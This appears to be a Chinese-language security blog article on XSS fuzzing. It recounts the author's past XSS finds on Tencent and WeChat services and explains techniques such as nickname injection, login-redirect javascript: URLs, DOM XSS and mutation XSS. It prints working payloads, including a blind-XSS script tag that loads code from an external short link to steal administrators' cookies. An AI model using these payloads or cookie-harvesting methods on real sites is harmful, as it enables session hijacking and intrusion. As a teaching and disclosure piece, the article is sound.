# 跨站的艺术-XSS Fuzzing 的技巧

对于XSS的漏洞挖掘过程，其实就是一个使用Payload不断测试和调整再测试的过程，这个过程我们把它叫做Fuzzing；同样是Fuzzing，有些人挖洞比较高效，有些人却不那么容易挖出漏洞，除了掌握的技术之外，比如编码的绕过处理等，还包含一些技巧性的东西，掌握一些技巧和规律，可以使得挖洞会更加从容。

XSS应该是我挖过的最多漏洞的一种Web漏洞类型，累积下来，就国内BAT、金山、新浪、网易等这些互联网公司的XSS，应该至少也有超过100个，这篇文章主要就是根据自己的一些经验与大家一起探讨编码绕过、处理等技术因素之外的XSS Fuzzing的一些技巧。

> Fuzzing（模糊测试）是挖掘漏洞最常用的手段之一，不止是XSS，应该可以说Fuzzing可以用于大部分类型的漏洞挖掘。通俗可以把这种方式理解为不断尝试的过程。

**XSS的Fuzzing流程**

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490259301866_8855_1490259302672.jpg)

这是一个比较常规的Web漏扫中XSS检测插件的一个流程图，其中比较关键的几个点在于：

* 检测输入点
* 潜在注入点检测
* 生成Payload
* Payload攻击验证

检测输入点其实就是寻找数据入口，比如说GET/POST数据，或者Header头部里的UA/Referer/Cookie，再或者URL路径等等，这些都可以成为输入入口，转换为比较形象点的说法，比如看到一个搜索框，你可能会在搜索框里提交关键词进行搜索，那么这里可能就发生了一个GET或者POST请求，这里其实就是一个输入点。

其次是潜在注入点检测，潜在注入的检测是判断输入点是否可以成功把数据注入到页面内容，对于提交数据内容但是不输出到页面的输入点是没有必要进行Fuzzing的，因为即使可以提交攻击代码，也不会产生XSS；在潜在注入点的检测通常使用的是一个随机字符串，比如随机6位数字，再判断这6位数字是否返回输出在页面，以此来进行判断。为什么不直接使用Payload进行判断呢？因为Payload里包含了攻击代码，通常很多应用都有防火墙或者过滤机制，Payload中的关键词会被拦截导致提交失败或者不会返回输出在页面，但这种情况不代表不能XSS，因为有可能只是Payload不够好，没有绕过过滤或者其他安全机制，所以采用无害的随机数字字符就可以避免这种情况产生，先验证可注入，再调整Payload去绕过过滤；而随机的目的在于不希望固定字符成为XSS防御黑名单里的关键词。

再者就是生成Payload和进行攻击验证的过程，Payload的好坏决定了攻击是否可以成功；而对于不同情况的注入点，需要使用的Payload也是不同的，比如，注入的位置在标签属性中还是标签事件中，使用的Payload是不同的；

```text
标签属性中：如<a href="注入位置">test</a>，Payload："></a><script>alert(0)</script><a  href="
标签事件中：<img href="a.jpg" onload="注入位置">, Payload：alert(0)
```

其实Payload的生成就是一个不断Fuzzing和不断调整的过程，根据注入位置上下文代码的结构、内容以及应用过滤机制等不断调整和不断提交测试的过程，下图是一个Payload的生成流程。

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490259526183_2803_1490259526753.jpg)

那么假如某次Payload调整后Fuzzing成功，也就意味XSS注入成功，并得出这个漏洞的PoC。

其实为什么一开始就介绍下扫描器常规的XSS检测方式呢？因为手工Fuzzing XSS其实也是这样一个过程，很多安全工具其实就是将手工的过程自动化。

接下来进入正题我们一起探讨一些XSS的挖掘技巧。

**不一样的昵称**

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490259664341_7612_1490259665162.png)

这是一个微信网页版的存储型XSS，注入点是微信昵称的位置（右图），通过访问微信群成员列表可以触发XSS导致弹框。

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490259687712_2773_1490259688437.png)

这是微信某个春节摇一摇活动的XSS（这里是生效了`<h1>`），通过微信访问活动页面，自动授权后获取微信昵称并自动显示在活动页面，当时微信昵称是：`<h1>张祖优(Fooying)";alert(0)//`，由于`<h1>`生效，导致昵称显示变大。

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490259762767_2408_1490259763381.png)

这仍然是腾讯某个产品的活动页面，也是通过微信点击自动获取昵称然后在活动页面显示，这个截图的页面链接实际是：

```text
http://tdf.qq.com/mobile/index2.html?name=<a href="http://www.fooying.com">点击抽奖</a>&type=share&from=timeline&isappinstalled=1
```

相当于当时我的昵称是：`<a href="http://www.fooying.com">点击抽奖</a>`![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490259808682_4812_1490259809864.png)

这也是一个微信网页版存储型XSS，注入点同样是在昵称，通过访问通讯录可以触发XSS，触发的昵称大概是：`<img src=0 onerror=alert(5)>`。

看了几个漏洞，再给大家看看我之前的QQ昵称和微信昵称：

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/qq_nichen.jpg)

其中右图的昵称是`<h1>张祖优(xxxx)";alert(0)//`。

看了上面的例子，我想大家已经可以发现，前面的几个XSS其实都是基本通过昵称的位置提交攻击代码导致了XSS的产生，这其实就是一种XSS被动挖掘的技巧。其实漏洞挖掘，特别是XSS，有时候是靠主动挖掘，但更多的时候也可以通过被动的方式发现，特别是类似QQ、微信这种一号多用的情况，可以想象你的微信昵称、QQ昵称或者签名等，在不同的应用、网页中登录，你的昵称就会在不同的地方显示，这些昵称在微信、QQ本身不会导致问题的产生，但到了其他页面呢？也许就会导致问题的产生。

当然，现在微信应不允许设置含有特殊字符的昵称了，而QQ大家也可以看到，对尖括号进行了转义，不过在这之前，单单就微信昵称，通过这种方式，我起码发现了腾讯以及非腾讯的各种朋友圈中的活动的不下于二十个XSS。

**网址跳转中的规律**

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260087088_9851_1490260087822.png)

这是一个13年提交的腾讯云登录跳转的XSS。

前一段时间雷锋网有对我做了一个[采访](https://www.leiphone.com/news/201703/ivnUzjjWk20kBsrM.html)，这篇文章也发在KM上，不知道大家有没有看到其中有一个细节，讲的是我为了哄女朋友开心，然后挖洞收集公仔，当时其实我是在两天内挖洞十几个洞，并且都是XSS。可能大家就会好奇为什么能一下子挖洞那么多的洞，还是不同厂商的，我现在能记得的有YY、4399、搜狐畅游等，其实是当时找到一个规律，上图中腾讯云的这个XSS也属于这个规律，所以就专门提出来。

登录和注册是大部分网站的必备功能，而不知道大家有没有注意到一个细节，当你在未登录状态下访问一些需要需要登录态的页面，比如个人中心，他会自动跳转到登录或者注册页面要求你登录，然后这个时候的登录URL其实会带有一个跳转URL，这是为了方便你登录后直接跳转到你原来访问的页面，是一个比较好的用户体验的设计。

在使用这样的功能的时候，我直接手上尝试，直接把跳转的URL修改为我的博客链接，然后再登录，发现可以直接跳转到我的博客，于是我再尝试了javascript%3Aalert\(0\)，发现JS代码可以直接执行并弹了个框。这个功能的设计其实原来是进行站内的跳转，但是由于功能设计上的缺陷，没有对跳转的URL进行判断或者判断有问题，于是可以导致直接跳转到其他网站或者产生XSS。当然，不止是登录，注册功能也存在同样问题。当时我去测试了很多网站，发现很多网站就存在这样的问题，于是我才可以做到连续去挖不同网站的漏洞来收集公仔，就是用了同样的一个问题。

```text
http://www.xxx.com/login?url=xxx
http://www.xxx.com/reg?url=xxx
```

而整体的测试流程大概是这样的：![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260170587_2893_1490260171238.png)

**\#号里的秘密**

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260253352_826_1490260253960.png)

这是之前腾讯云官网的一个DOM XSS

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260299893_848_1490260300657.png)

这是之前微信国外版官网的一处 DOM XSS

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260334210_8515_1490260335080.jpeg)

这是之前ent.qq.com域下的一个DOM XSS，这里应该是实现一个页面访问来源统计的功能，将referer拼接到URL通过img加载的方式发起GET请求以此向服务端发送访问来源URL，黑客可以构造地址为`http://www.0xsafe.com" onerror="alert(0)` 的页面点击链接跳转到 `http://datalib.ent.qq.com/tv/3362/detail.shtml`，就可以触发XSS。

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260393558_2896_1490260394596.png)

这是比较早提交的一个游戏igame.qq.com的DOM XSS，这处的XSS正好当时保存下JS，如下，读取window.location然后写入到ID为output的标签代码里，于是导致XSS的产生。

```markup
<script language="JavaScript">
    document.domain="qq.com";
    function pageLoaded(){
        window.parent.dhtmlHistory.iframeLoaded(window.location);
        document.getElementById("output").innerHTML = window.location;
    }
</script>
```

其实不难可以发现，这类XSS在大部分情况下也是有一些技巧可言的，比如大家可以发现网址中都存在\#（DOM XSS不是一定URL得存在\#，只是这种情况比较常见）；那么是不是见到网址中存在\#就可以随便去修改\#后面的内容就Fuzzing一通呢？当然不是，还需要去判断页面的源码中的JS代码以及页面引用的JS文件的代码中是否存在对以下内容的使用，是否存在没有过滤或者过滤不全的情况下将以下的内容直接输入到DOM树里。

```markup
document.location/location
document.URL
document.URLUnencoded
deddocument.referrer
window.location
```

一旦有存在以上的情况，那么往往存在DOM XSS的概率就比较大，接下来就是看看能不能绕过相关的过滤和安全机制的处理。

**被改变的内容**

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260533757_8493_1490260534472.png)

这是之前挖的一个存在于以前PC 版本QQ的网页预览功能的一个XSS；通过在聊天窗口分享文章，然后点击链接会在右侧打开页面显示文章的内容，会导致XSS的产生。

> 为什么在客户端里也会存在XSS?其实很多客户端，包括现在很多手机APP，很多功能都是通过内嵌网页进行实现的，于是也就为什么会存在XSS等前端问题。这些网页可以通过设置代理的方式来发现。

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260575096_5063_1490260575886.png)

这是一篇发表在博客园的文章，文章里包含一些XSS的攻击代码，但是可以发现代码在博客园本身已经被进行了转义，没法产生XSS。

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260620615_3974_1490260621196.png)

而文章被在QQ中预览的时候，可以发现，被转义的攻击代码又转义了回来（因为这个功能需要只显示文本内容，而删除一些没必要的页面框架、内容的显示，所有对内容有做了一些转码等操作），导致的攻击代码的生效，并由此产生了XSS（其实这类XSS叫做mXSS，突变型XSS）。

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260654619_6339_1490260655454.png)

这是一篇发表在微信公众号的文章，文章中包含了一些XSS盲打（后面会进行介绍）的攻击代码，然后可以看到，在微信公众号文章里代码被进行了转义，而无法生效产生XSS。

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260686959_8118_1490260687674.png)

chuansong.me是一个第三方网站，会主动采集微信公众号上的一些文章并生成访问链接和索引，可以看到同样的一篇文章在被传送门采集转载后，本来会被转义的代码直接生效了，于是就成为了存储型XSS，我们通过盲打平台也可以看到其他用户访问这篇文章而被采集并发送到盲打平台的Cookie。

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260725666_8096_1490260726286.png)

有的时候，被转义的内容也会成为生效的攻击代码，通过控制源头的方式也可以使得XSS的攻击产生。

**随手进行的XSS盲打**

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260769622_7106_1490260770591.png)

这是我XSS盲打平台项目的其中一页结果截图，这里的每一项都包含对应网址访问用户的Cookie，而Cookie则可以用来直接登录对应的地址；在图里包含了360 soso、360游戏客服、新浪邮箱等几个网站的后台的Cookie，不过可惜的是，由于这些平台进行了访问限制，所以外网无法访问，也无法登录。

抛开无法访问的问题，那么这些信息是怎么得来了呢？XSS盲打。

> 常规的XSS攻击是通过页面返回内容中JS攻击代码的生效与否来判断XSS的攻击是否成功；而对于一些网页功能，比如反馈，我们可以发现，不管你提交什么内容，返回的内容都是"感谢您的反馈"类似的语句，并不会根据你提交的内容而在页面中显示不同的内容，对于这样的内容提交点，就无法通过页面反馈判断攻击代码是否注入成功，那么就可以通过XSS盲打。  
> XSS盲打一般通过XSS盲打平台，在XSS盲打平台建立项目，会生成项目攻击链接，实际上就是一个类似JS文件的访问链接，这个JS文件中其中至少包含一个功能，那就是向盲打平台发送GET/POST请求传输数据回来，比如Cookie，这样的话，类似在反馈页面提交的攻击代码一旦生效，就等于JS代码被执行，那么就会向盲打平台返回数据，那就说明攻击成功了；假如一直没有返回数据，那就说明提交的攻击代码没有执行或者执行出问题，也就证明攻击失败。  
> 盲打平台的项目：

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260814055_1991_1490260814898.png)

对于我而言，看到类似下图这样一个内容提交的地方，我都会忍不住提交盲打代码

```markup
</textarea>'"><script src=http://t.cn/R6qRcps></script>
```

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260857481_2744_1490260858052.png)

而类似于这样的功能，如果存在XSS，一般会在什么地方什么时候出发攻击代码呢？管理人员在后台审核这些内容的时候，所以说一般XSS盲打如果成功，往往可以获得对应功能管理后台的地址以及管理员的Cookie，假如管理后台没有做访问的限制，就能用对应管理员的Cookie登录上去。

![](https://www.fooying.com/images/post/the-art-of-xss-2-xss-fuzzing/1490260866874_8430_1490260867678.png)

这就是上图手游客服中心盲打成功得到的后台地址和Cookie（当前已失效并修复）。

**总结**

在XSS的世界里有很多的Fuzzing技巧和方式，学会从正常功能中发现攻击方式，在Web安全的世界里，除了技术，还需要猥琐的思维和技巧。  
另外，其实大家不难发现，不管是昵称、网址跳转或者是文章提到的内容转义的变化也好，很多时候内容原有的地方并不会触发XSS，而内容在其他地方使用后则就触发了XSS，所以对于开发人员来说，不管是来自哪里的内容，都应该有自己的过滤机制，而不能完全的信任，其实总结一句话就是：任何的输入都是有害的！

